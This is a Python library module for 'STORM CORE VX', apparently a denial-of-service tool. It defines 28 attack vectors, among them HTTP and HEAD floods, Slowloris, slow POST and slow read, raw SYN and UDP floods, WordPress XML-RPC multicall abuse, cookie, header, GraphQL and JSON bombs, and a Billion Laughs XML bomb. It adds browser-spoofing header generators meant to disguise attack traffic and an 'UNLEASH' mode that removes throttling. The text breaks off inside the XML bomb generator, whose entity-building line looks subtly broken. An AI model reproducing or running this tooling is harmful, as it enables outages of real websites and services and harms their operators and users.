#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
STORM CORE VX — Library Module
All constants, classes, header generators, payload generators,
discovery, stats, dashboard, auto-throttle for the 28-vector engine.
"""

import asyncio
import time
import statistics
import sys
import random
import string
import re
import ssl
import os
import select
import shutil
import struct
import socket
import json

if sys.platform == 'win32':
    try:
        import msvcrt
        HAS_MSVCRT = True
    except ImportError:
        HAS_MSVCRT = False
else:
    HAS_MSVCRT = False

try:
    import tty, termios
    HAS_TERMIOS = True
except ImportError:
    HAS_TERMIOS = False

from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple
from collections import deque
from enum import Enum, auto

try:
    import aiohttp
except ImportError:
    print("Error: pip install aiohttp")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# Colors
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'
    BG_R = '\033[41m'; BG_G = '\033[42m'; BG_Y = '\033[43m'
    BG_B = '\033[44m'; BG_M = '\033[45m'; BG_CY = '\033[46m'
    BG_W = '\033[47m'; BG_D = '\033[100m'


# ═══════════════════════════════════════════════════════════════════════════════
# Attack Modes — 28 Vectors
# ═══════════════════════════════════════════════════════════════════════════════

class AttackMode(Enum):
    # Original 8
    FLOOD = 1
    SLOWLORIS = 2
    SLOW_POST = 3
    RANGE = 4
    LOGIN = 5
    RESOURCE = 6
    POST_BOMB = 7
    SSL_FLOOD = 8
    # Batch 2: L7 Heavy (10)
    H2_RAPID = 9
    WS_FLOOD = 10
    WP_XMLRPC = 11
    CACHE_STORM = 12
    API_FUZZ = 13
    MULTIPART = 14
    HEADER_BOMB = 15
    CHUNKED = 16
    SESSION_FLOOD = 17
    GQL_BOMB = 18
    # Batch 3: L4 + L7 Heavy (10)
    SYN_FLOOD = 19       # L4: SYN Flood (raw socket)
    UDP_FLOOD = 20       # L4: UDP Flood (raw socket)
    COOKIE_BOMB = 21     # L7: Cookie Bomb (massive cookies)
    HEAD_FLOOD = 22      # L7: HTTP HEAD Flood
    XML_BOMB = 23        # L7: XML Billion Laughs
    SLOW_READ = 24       # L7: Slow Read (reverse Slowloris)
    CONN_FLOOD = 25      # L7: CONNECTION Flood (open only)
    HTTP10_FLOOD = 26    # L7: HTTP/1.0 Flood (no keep-alive)
    URL_FUZZ = 27        # L7: URL Fuzzer (404 storm)
    JSON_BOMB = 28       # L7: JSON Bomb (deep nesting)
    CRASH = 99


ATTACK_NAMES = {
    AttackMode.FLOOD: "HTTP Flood",     AttackMode.SLOWLORIS: "Slowloris",
    AttackMode.SLOW_POST: "Slow POST",  AttackMode.RANGE: "Range Exploit",
    AttackMode.LOGIN: "Login Flood",    AttackMode.RESOURCE: "Resource Bomb",
    AttackMode.POST_BOMB: "POST Bomb",  AttackMode.SSL_FLOOD: "SSL Flood",
    AttackMode.H2_RAPID: "H2 RapidRST", AttackMode.WS_FLOOD: "WebSocket",
    AttackMode.WP_XMLRPC: "WP XMLRPC",  AttackMode.CACHE_STORM: "Cache Storm",
    AttackMode.API_FUZZ: "API Fuzz",    AttackMode.MULTIPART: "Multipart",
    AttackMode.HEADER_BOMB: "Header Bom", AttackMode.CHUNKED: "Chunked Exp",
    AttackMode.SESSION_FLOOD: "SessionFl", AttackMode.GQL_BOMB: "GraphQL",
    AttackMode.SYN_FLOOD: "SYN Flood",  AttackMode.UDP_FLOOD: "UDP Flood",
    AttackMode.COOKIE_BOMB: "Cookie Bomb", AttackMode.HEAD_FLOOD: "HEAD Flood",
    AttackMode.XML_BOMB: "XML Bomb",    AttackMode.SLOW_READ: "Slow Read",
    AttackMode.CONN_FLOOD: "CONN Flood", AttackMode.HTTP10_FLOOD: "HTTP/1.0",
    AttackMode.URL_FUZZ: "URL Fuzzer",  AttackMode.JSON_BOMB: "JSON Bomb",
}

ATTACK_SHORT = {
    AttackMode.FLOOD: "FLD",   AttackMode.SLOWLORIS: "SLW",
    AttackMode.SLOW_POST: "SPS", AttackMode.RANGE: "RNG",
    AttackMode.LOGIN: "LGN",   AttackMode.RESOURCE: "RES",
    AttackMode.POST_BOMB: "PBM", AttackMode.SSL_FLOOD: "SSL",
    AttackMode.H2_RAPID: "H2R", AttackMode.WS_FLOOD: "WSF",
    AttackMode.WP_XMLRPC: "WXP", AttackMode.CACHE_STORM: "CBS",
    AttackMode.API_FUZZ: "API", AttackMode.MULTIPART: "MUL",
    AttackMode.HEADER_BOMB: "HDB", AttackMode.CHUNKED: "CHK",
    AttackMode.SESSION_FLOOD: "SSF", AttackMode.GQL_BOMB: "GQL",
    AttackMode.SYN_FLOOD: "SYN", AttackMode.UDP_FLOOD: "UDP",
    AttackMode.COOKIE_BOMB: "CKB", AttackMode.HEAD_FLOOD: "HED",
    AttackMode.XML_BOMB: "XML", AttackMode.SLOW_READ: "SRD",
    AttackMode.CONN_FLOOD: "CNF", AttackMode.HTTP10_FLOOD: "H10",
    AttackMode.URL_FUZZ: "URL", AttackMode.JSON_BOMB: "JSB",
}

ATTACK_COLORS = {
    AttackMode.FLOOD: C.R,          AttackMode.SLOWLORIS: C.M,
    AttackMode.SLOW_POST: C.Y,      AttackMode.RANGE: C.CY,
    AttackMode.LOGIN: C.B,          AttackMode.RESOURCE: C.G,
    AttackMode.POST_BOMB: C.BD+C.R, AttackMode.SSL_FLOOD: C.BD+C.CY,
    AttackMode.H2_RAPID: C.BD+C.M,  AttackMode.WS_FLOOD: C.BD+C.G,
    AttackMode.WP_XMLRPC: C.BD+C.Y, AttackMode.CACHE_STORM: C.CY,
    AttackMode.API_FUZZ: C.M,       AttackMode.MULTIPART: C.BD+C.B,
    AttackMode.HEADER_BOMB: C.Y,    AttackMode.CHUNKED: C.G,
    AttackMode.SESSION_FLOOD: C.B,  AttackMode.GQL_BOMB: C.BD+C.M,
    AttackMode.SYN_FLOOD: C.BD+C.R, AttackMode.UDP_FLOOD: C.BD+C.Y,
    AttackMode.COOKIE_BOMB: C.BD+C.G, AttackMode.HEAD_FLOOD: C.CY,
    AttackMode.XML_BOMB: C.BD+C.M,  AttackMode.SLOW_READ: C.M,
    AttackMode.CONN_FLOOD: C.BD+C.CY, AttackMode.HTTP10_FLOOD: C.Y,
    AttackMode.URL_FUZZ: C.R,       AttackMode.JSON_BOMB: C.BD+C.B,
}

DEFAULT_ATTACKS = set(AttackMode) - {AttackMode.CRASH}  # ALL 28 attacks from start

ATTACK_ACTIVATE_ORDER = [
    AttackMode.H2_RAPID, AttackMode.WS_FLOOD, AttackMode.WP_XMLRPC,
    AttackMode.CACHE_STORM, AttackMode.API_FUZZ, AttackMode.MULTIPART,
    AttackMode.HEADER_BOMB, AttackMode.CHUNKED, AttackMode.SESSION_FLOOD,
    AttackMode.GQL_BOMB, AttackMode.SYN_FLOOD, AttackMode.UDP_FLOOD,
    AttackMode.COOKIE_BOMB, AttackMode.HEAD_FLOOD, AttackMode.XML_BOMB,
    AttackMode.SLOW_READ, AttackMode.CONN_FLOOD, AttackMode.HTTP10_FLOOD,
    AttackMode.URL_FUZZ, AttackMode.JSON_BOMB,
]

L4_ATTACKS = {AttackMode.SYN_FLOOD, AttackMode.UDP_FLOOD}


class CircuitState(Enum):
    CLOSED = auto()
    OPEN = auto()
    HALF_OPEN = auto()


# ═══════════════════════════════════════════════════════════════════════════════
# Smart Resource Manager
# ═══════════════════════════════════════════════════════════════════════════════

class ResourceManager:
    """Monitors system CPU/RAM/Bandwidth and limits STORM to keep the machine responsive.

    Modes:
      SAFE    — cap CPU at 50%, RAM at 40%, BW at 5-10 MB/s  (default, system stays smooth)
      NORMAL  — cap CPU at 75%, RAM at 60%, BW at 50 MB/s   (more aggressive)
      UNLEASH — NO limits at all                             (X key = 1000% power)
    """
    SAFE = 0
    NORMAL = 1
    UNLEASH = 2

    def __init__(self):
        import multiprocessing as mp
        self.cpu_count = mp.cpu_count()
        self.total_ram = self._get_total_ram()
        self.mode = self.SAFE
        self._unleash = False
        # Safe-mode limits
        self.cpu_limit_safe = 50    # percent
        self.ram_limit_safe = 40    # percent
        self.bw_limit_safe = 10     # MB/s (max, randomizes 5-10)
        self.bw_min_safe = 5        # MB/s (min)
        # Normal-mode limits
        self.cpu_limit_normal = 75
        self.ram_limit_normal = 60
        self.bw_limit_normal = 50   # MB/s
        # Worker caps per mode
        self._worker_cap_safe = 8000
        self._worker_cap_normal = max(500, self.cpu_count * 250)
        self._worker_cap_unleash = 999999  # effectively unlimited
        # Current snapshot
        self.cpu_pct = 0.0
        self.ram_pct = 0.0
        self.ram_used_gb = 0.0
        self._last_check = 0
        # Bandwidth tracking
        self._bw_bytes = 0          # total bytes transferred
        self._bw_start = 0.0       # timestamp of BW measurement start
        self._bw_current_mbps = 0.0 # current measured MB/s
        self._bw_window = deque(maxlen=60)  # last 60 BW samples (1 per second)

    @staticmethod
    def _get_total_ram():
        """Get total system RAM in bytes."""
        try:
            import psutil
            return psutil.virtual_memory().total
        except ImportError:
            pass
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if line.startswith('MemTotal:'):
                        return int(line.split()[1]) * 1024
        except:
            pass
        # Fallback: assume 8GB
        return 8 * 1024 * 1024 * 1024

    def _get_usage(self):
        """Get current CPU% and RAM% usage."""
        cpu = 0.0; ram = 0.0; ram_gb = 0.0
        try:
            import psutil
            cpu = psutil.cpu_percent(interval=0)
            mem = psutil.virtual_memory()
            ram = mem.percent
            ram_gb = mem.used / (1024**3)
        except ImportError:
            try:
                with open('/proc/stat', 'r') as f:
                    line1 = f.readline()
                import time as _t; _t.sleep(0.1)
                with open('/proc/stat', 'r') as f:
                    line2 = f.readline()
                v1 = list(map(int, line1.split()[1:])); v2 = list(map(int, line2.split()[1:]))
                d = max(sum(v2) - sum(v1), 1); idle = v2[3] - v1[3]
                cpu = max(0, min(100, (1 - idle / d) * 100))
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemAvailable:') or line.startswith('MemFree:'):
                            avail = int(line.split()[1]) * 1024; break
                    else:
                        avail = 0
                if self.total_ram > 0 and avail > 0:
                    ram = (1 - avail / self.total_ram) * 100
                    ram_gb = (self.total_ram - avail) / (1024**3)
            except:
                pass
        return cpu, ram, ram_gb

    def set_unleash(self, on=True):
        self._unleash = on
        self.mode = self.UNLEASH if on else self.SAFE

    @property
    def is_unleash(self):
        return self._unleash

    @property
    def mode_name(self):
        return ["SAFE", "NORMAL", "UNLEASH"][self.mode]

    @property
    def worker_cap(self):
        if self.mode == self.UNLEASH: return self._worker_cap_unleash
        elif self.mode == self.NORMAL: return self._worker_cap_normal
        return self._worker_cap_safe

    @property
    def cpu_limit(self):
        if self.mode == self.UNLEASH: return 100
        elif self.mode == self.NORMAL: return self.cpu_limit_normal
        return self.cpu_limit_safe

    @property
    def ram_limit(self):
        if self.mode == self.UNLEASH: return 100
        elif self.mode == self.NORMAL: return self.ram_limit_normal
        return self.ram_limit_safe

    @property
    def bw_limit(self):
        """Bandwidth limit in MB/s for current mode."""
        if self.mode == self.UNLEASH: return 0  # 0 = unlimited
        elif self.mode == self.NORMAL: return self.bw_limit_normal
        # SAFE mode: randomize between 5-10 MB/s each check
        return random.randint(self.bw_min_safe, self.bw_limit_safe)

    @property
    def bw_limit_display(self):
        """Stable display string for BW limit (not randomized)."""
        if self.mode == self.UNLEASH: return "UNLIMITED"
        elif self.mode == self.NORMAL: return f"{self.bw_limit_normal} MB/s"
        return f"{self.bw_min_safe}-{self.bw_limit_safe} MB/s"

    def record_bandwidth(self, bytes_transferred):
        """Record bytes transferred for bandwidth calculation."""
        self._bw_bytes += bytes_transferred

    def update_bandwidth(self):
        """Calculate current bandwidth (MB/s) and update tracking.
        Should be called every ~1 second from the render loop."""
        now = time.time()
        if self._bw_start == 0:
            self._bw_start = now
            return
        elapsed = now - self._bw_start
        if elapsed < 1.0:
            return
        mbps = (self._bw_bytes / (1024 * 1024)) / elapsed
        self._bw_window.append(mbps)
        self._bw_current_mbps = mbps
        self._bw_bytes = 0
        self._bw_start = now

    @property
    def current_bw_mbps(self):
        """Current bandwidth in MB/s."""
        if self._bw_window:
            return sum(self._bw_window) / len(self._bw_window)
        return self._bw_current_mbps

    @property
    def is_bw_limited(self):
        """Check if current bandwidth exceeds the mode limit."""
        if self.mode == self.UNLEASH: return False
        limit = self.bw_limit
        if limit <= 0: return False
        return self.current_bw_mbps > limit

    def update(self):
        """Refresh CPU/RAM readings. Call every 1-2 seconds."""
        now = time.time()
        if now - self._last_check < 1: return
        self._last_check = now
        self.cpu_pct, self.ram_pct, self.ram_used_gb = self._get_usage()

    def should_throttle(self):
        """Return (bool, float) — should_throttle, step_multiplier."""
        if self.mode == self.UNLEASH: return False, 1.0
        self.update()
        self.update_bandwidth()
        cpu_ok = self.cpu_pct < self.cpu_limit
        ram_ok = self.ram_pct < self.ram_limit
        bw_ok = not self.is_bw_limited
        if not cpu_ok and not ram_ok:
            return True, 0.1   # severe throttle
        if not cpu_ok:
            return True, 0.3   # CPU throttle
        if not ram_ok:
            return True, 0.3   # RAM throttle
        if not bw_ok:
            return True, 0.2   # Bandwidth throttle — aggressive slow-down
        if self.cpu_pct > self.cpu_limit * 0.85:
            return False, 0.6  # approaching limit, slow down
        if self.ram_pct > self.ram_limit * 0.85:
            return False, 0.6
        if self.mode != self.UNLEASH and self.bw_limit > 0:
            if self.current_bw_mbps > self.bw_limit * 0.85:
                return False, 0.5  # approaching BW limit, slow down
        return False, 1.0

    @property
    def status_line(self):
        """Short status string for dashboard."""
        icon = {self.SAFE: "🛡️SAFE", self.NORMAL: "⚡NORM", self.UNLEASH: "🔥MAX"}.get(self.mode, "SAFE")
        bw_str = f"BW:{self.current_bw_mbps:.1f}/{self.bw_limit_display}" if self.mode != self.UNLEASH else f"BW:{self.current_bw_mbps:.1f}/UNLIMITED"
        return f"{icon} CPU:{self.cpu_pct:.0f}%/{self.cpu_limit}% RAM:{self.ram_pct:.0f}%/{self.ram_limit}% {bw_str} ({self.ram_used_gb:.1f}GB/{self.total_ram/(1024**3):.0f}GB) Cap:{self.worker_cap:,}w"

    @property
    def ram_total_gb(self):
        return self.total_ram / (1024**3)


# ═══════════════════════════════════════════════════════════════════════════════
# Constants & User-Agents
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.7.3329.35",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-US,en;q=0.5", "en-GB,en;q=0.8", "en,en;q=0.5",
    "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en;q=0.5",
    "fr-FR,fr;q=0.9,en;q=0.5", "ja-JP,ja;q=0.9,en;q=0.5",
]

SEC_CH_LIST = [
    '"Not A(Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"',
    '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
    '"Chromium";v="125", "Not.A/Brand";v="24"',
]


# ═══════════════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def rs(n=8, c=string.ascii_lowercase + string.digits):
    return ''.join(random.choices(c, k=n))

def rua():
    return random.choice(USER_AGENTS)

def rlang():
    return random.choice(ACCEPT_LANGS)

def rsec():
    return random.choice(SEC_CH_LIST)

def rcache():
    return f"_{rs(6)}={random.randint(1000, 99999)}"

def fmt_bytes(b):
    if b < 1024: return f"{b} B"
    elif b < 1024*1024: return f"{b/1024:.1f} KB"
    elif b < 1024*1024*1024: return f"{b/(1024*1024):.1f} MB"
    else: return f"{b/(1024*1024*1024):.2f} GB"

def fmt_bits(b):
    bits = b * 8
    if bits < 1000: return f"{bits} bps"
    elif bits < 1000000: return f"{bits/1000:.1f} Kbps"
    elif bits < 1000000000: return f"{bits/1000000:.1f} Mbps"
    else: return f"{bits/1000000000:.2f} Gbps"

def fmt_time(s):
    if s < 60: return f"{s:.0f}s"
    elif s < 3600: return f"{s/60:.1f}m"
    else: return f"{s/3600:.1f}h"

def get_terminal_size():
    try:
        cols, rows = shutil.get_terminal_size((80, 24))
        return cols, rows
    except:
        return 80, 24


# ═══════════════════════════════════════════════════════════════════════════════
# Header Forge — All 28 attack headers
# ═══════════════════════════════════════════════════════════════════════════════

class HF:
    @staticmethod
    def flood(url):
        return {
            "User-Agent": rua(),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            ]),
            "Accept-Language": rlang(),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Pragma": "no-cache",
            "Sec-Ch-Ua": rsec(),
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": random.choice(["none", "same-origin"]),
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Connection": random.choice(["keep-alive", "close"]),
        }

    @staticmethod
    def slowloris(host):
        return (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {rua()}\r\n"
            f"Accept: text/html,application/xhtml+xml\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
        )

    @staticmethod
    def sl_extra():
        return f"X-{rs(random.randint(5,12), string.ascii_lowercase)}: {rs(random.randint(3,15))}\r\n"

    @staticmethod
    def login(url, root):
        h = HF.flood(url)
        h.update({"Content-Type": "application/x-www-form-urlencoded", "Origin": root, "Referer": url, "Sec-Fetch-Site": "same-origin"})
        return h

    @staticmethod
    def resource():
        return {
            "User-Agent": rua(),
            "Accept": random.choice(["image/avif,image/webp,image/*,*/*;q=0.8", "*/*"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": rlang(),
            "Cache-Control": "no-cache",
            "Sec-Fetch-Dest": random.choice(["image", "script", "style", "font"]),
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "same-origin",
        }

    @staticmethod
    def range_():
        ranges = []
        for _ in range(random.randint(3, 8)):
            s = random.randint(0, 1000000)
            ranges.append(f"{s}-{s + random.randint(100, 10000)}")
        return {"User-Agent": rua(), "Accept": "*/*", "Accept-Encoding": "identity", "Range": f"bytes={','.join(ranges)}", "Cache-Control": "no-cache"}

    @staticmethod
    def post_bomb(url, root, cl):
        return {
            "User-Agent": rua(), "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": rlang(), "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": random.choice(["application/x-www-form-urlencoded", "application/json", "multipart/form-data; boundary=----WB" + rs(16)]),
            "Content-Length": str(cl), "Origin": root, "Referer": url,
            "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive",
        }

    @staticmethod
    def ssl_flood(host):
        return {"User-Agent": rua(), "Accept": "*/*", "Connection": "keep-alive"}

    @staticmethod
    def h2_rapid(host, path="/"):
        return {":method": "GET", ":path": path, ":authority": host, ":scheme": "https", "user-agent": rua(), "accept": "*/*"}

    @staticmethod
    def ws_flood(host, path="/"):
        return {"User-Agent": rua(), "Upgrade": "websocket", "Connection": "Upgrade",
                "Sec-WebSocket-Key": rs(22) + "==", "Sec-WebSocket-Version": "13",
                "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
                "Origin": f"https://{host}"}

    @staticmethod
    def wp_xmlrpc(url, root):
        return {"User-Agent": rua(), "Content-Type": "text/xml", "Accept": "text/xml,application/xml",
                "Accept-Language": rlang(), "Origin": root, "Referer": url, "Connection": "keep-alive"}

    @staticmethod
    def cache_storm(url):
        h = HF.flood(url)
        h["Cache-Control"] = "no-cache, no-store, must-revalidate"
        h["Pragma"] = "no-cache"
        return h

    @staticmethod
    def api_fuzz(url, root):
        return {"User-Agent": rua(), "Accept": "application/json, */*", "Accept-Language": rlang(),
                "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json",
                "Origin": root, "Referer": url, "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive"}

    @staticmethod
    def multipart(url, root, boundary):
        return {"User-Agent": rua(), "Accept": "*/*", "Accept-Language": rlang(),
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Origin": root, "Referer": url, "Connection": "keep-alive"}

    @staticmethod
    def header_bomb():
        h = {"User-Agent": rua(), "Accept": "*/*", "Accept-Language": rlang(),
             "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
        for _ in range(random.randint(20, 50)):
            h[f"X-{rs(random.randint(4,10), string.ascii_uppercase+string.ascii_lowercase)}"] = rs(random.randint(5, 30))
        return h

    @staticmethod
    def chunked(host, path="/"):
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {rua()}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
        )

    @staticmethod
    def session_flood(url, root):
        h = HF.flood(url)
        h["Cookie"] = f"PHPSESSID={rs(26)}; sessionid={rs(32)}; csrftoken={rs(40)}; _ga={rs(12)}; _gid={rs(12)}"
        h["Origin"] = root; h["Referer"] = url
        return h

    @staticmethod
    def gql_bomb(url, root):
        return {"User-Agent": rua(), "Accept": "application/json", "Accept-Language": rlang(),
                "Content-Type": "application/json", "Origin": root, "Referer": url,
                "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive"}

    # ─── New 10 attack headers ───

    @staticmethod
    def cookie_bomb(url, root):
        """Massive cookies (8KB+ total)."""
        h = HF.flood(url)
        cookies = []
        for i in range(random.randint(8, 15)):
            name = f"bomb{i}_{rs(6)}"
            value = rs(random.randint(200, 600))
            cookies.append(f"{name}={value}")
        cookies.append(f"PHPSESSID={rs(32)}")
        cookies.append(f"sessionid={rs(40)}")
        h["Cookie"] = "; ".join(cookies)
        h["Origin"] = root; h["Referer"] = url
        return h

    @staticmethod
    def head_flood(url):
        """HEAD request headers."""
        h = HF.flood(url)
        h["Accept"] = "*/*"
        return h

    @staticmethod
    def xml_bomb(url, root):
        """XML Bomb (Billion Laughs) headers."""
        return {"User-Agent": rua(), "Content-Type": "text/xml", "Accept": "text/xml,application/xml",
                "Accept-Language": rlang(), "Origin": root, "Referer": url, "Connection": "keep-alive",
                "SOAPAction": "http://tempuri.org/IBasicService/Process"}

    @staticmethod
    def slow_read(host, path="/"):
        """Slow Read: request with very small window."""
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {rua()}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Range: bytes=0-\r\n"
        )

    @staticmethod
    def conn_flood(host):
        """Just a minimal HTTP start line to keep connection alive."""
        return f"GET / HTTP/1.1\r\nHost: {host}\r\n"

    @staticmethod
    def http10_flood(host, path="/"):
        """HTTP/1.0 request — forces new connection each time."""
        return (
            f"GET {path} HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {rua()}\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
        )

    @staticmethod
    def url_fuzz():
        """Minimal headers for URL fuzzing."""
        return {"User-Agent": rua(), "Accept": "text/html,*/*", "Connection": "close"}

    @staticmethod
    def json_bomb(url, root):
        """JSON Bomb headers."""
        return {"User-Agent": rua(), "Accept": "application/json", "Accept-Language": rlang(),
                "Content-Type": "application/json", "Origin": root, "Referer": url,
                "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive"}


# ═══════════════════════════════════════════════════════════════════════════════
# Payload Generators
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadGen:
    @staticmethod
    def wp_xmlrpc_methods():
        methods = [
            ("wp.getUsersBlogs", ["admin", rs(12)]),
            ("wp.getPosts", ["1", "admin", rs(12), {"number": "500"}]),
            ("wp.getComments", ["1", "admin", rs(12), {"number": "500"}]),
            ("wp.getPages", ["1", "admin", rs(12), {"number": "500"}]),
            ("wp.getCategories", ["1", "admin", rs(12)]),
            ("wp.getTags", ["1", "admin", rs(12)]),
            ("system.listMethods", []),
            ("pingback.ping", ["https://example.com/" + rs(8), f"https://target/{rs(6)}"]),
        ]
        n = random.randint(3, 8)
        selected = random.sample(methods, min(n, len(methods)))
        calls = ""
        for method_name, params in selected:
            params_xml = ""
            for p in params:
                if isinstance(p, str):
                    params_xml += f"<param><value><string>{p}</string></value></param>"
                elif isinstance(p, dict):
                    struct_xml = ""
                    for k, v in p.items():
                        struct_xml += f"<member><name>{k}</name><value><string>{v}</string></value></member>"
                    params_xml += f"<param><value><struct>{struct_xml}</struct></value></param>"
            calls += f"<call><methodName>{method_name}</methodName><params>{params_xml}</params>"
        return f"""<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>"""

    @staticmethod
    def api_fuzz_json():
        templates = [
            lambda: json.dumps({"query": rs(20), "page": random.randint(1,999), "limit": 500, "sort": "created_at", "order": "desc", "filter": {"status": "active", "type": rs(5)}, "fields": [rs(8) for _ in range(10)]}),
            lambda: json.dumps({"search": rs(30), "facets": True, "highlight": True, "size": 200, "from": random.randint(0,10000)}),
            lambda: json.dumps({"operations": [{"op": "update", "id": rs(8), "data": {rs(6): rs(10) for _ in range(8)}} for _ in range(50)]}),
            lambda: json.dumps({rs(10): rs(20) for _ in range(random.randint(5, 15))}),
        ]
        return random.choice(templates)()

    @staticmethod
    def multipart_body(boundary):
        parts = []
        for _ in range(random.randint(3, 8)):
            name = rs(random.randint(5, 12))
            value = rs(random.randint(20, 100))
            parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}")
        filename = rs(8) + ".bin"
        file_data = rs(random.randint(51200, 204800))
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n{file_data}")
        parts.append(f"--{boundary}--\r\n")
        return "\r\n".join(parts).encode()

    @staticmethod
    def gql_deep_query():
        depth = random.randint(5, 12)
        query = "query { "
        for i in range(depth):
            field = random.choice(["users", "posts", "comments", "likes", "followers", "friends", "messages", "notifications", "orders", "products"])
            args = random.choice([f"(first: 500)", f"(limit: 1000)", f"(first: 200, after: \"{rs(20)}\")", f"(where: {{search: \"{rs(15)}\"}})"])
            query += f"{field}{args} {{ "
        query += "id " * 3
        query += "} " * depth
        query += "}"
        return json.dumps({"query": query, "variables": {rs(5): rs(10) for _ in range(3)}})

    @staticmethod
    def cache_bust_url(url):
        sep = '&' if '?' in url else '?'
        params = [f"{rs(random.randint(3,8))}={random.randint(10000,99999)}" for _ in range(random.randint(2, 6))]
        params.append(f"_={int(time.time()*1000)}")
        params.append(f"nocache={rs(12)}")
        return url + sep + "&".join(params)

    # ─── New 10 payload generators ───

    @staticmethod
    def xml_bomb_payload():
        """Billion Laughs — XML entity expansion bomb."""
        depth = random.randint(5, 10)
        entities = '<!DOCTYPE bomb [\n'
        entities += '  <!ENTITY x0 "LAUGH">\n'
        for i in range(1, depth):
            prev = "&x" + str(i-1) + ";" * 10
            entities += '  <!ENTITY x' + str(i) + ' "' + prev + '">\n'
        entities += ']>\n'
        body = f"&x{depth-1};" * random.randint(2, 5)
